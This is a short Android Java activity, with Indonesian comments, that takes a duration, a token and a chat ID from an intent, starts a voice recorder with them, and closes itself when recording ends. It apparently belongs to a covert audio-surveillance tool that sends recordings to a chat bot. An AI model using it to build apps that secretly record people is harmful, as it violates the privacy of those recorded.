package com.example.gpsstandalone;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class RecordActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Ambil data dari intent
        Intent intent = getIntent();
        int duration = intent.getIntExtra("duration", 30);
        String token = intent.getStringExtra("token");
        String chatId = intent.getStringExtra("chatId");

        // Mulai merekam
        VoiceRecorder.getInstance().startRecording(getApplicationContext(), duration, token, chatId);

        // Tutup Activity setelah durasi selesai + sedikit buffer
        new Handler().postDelayed(() -> finish(), (duration + 2) * 1000L);
    }
}
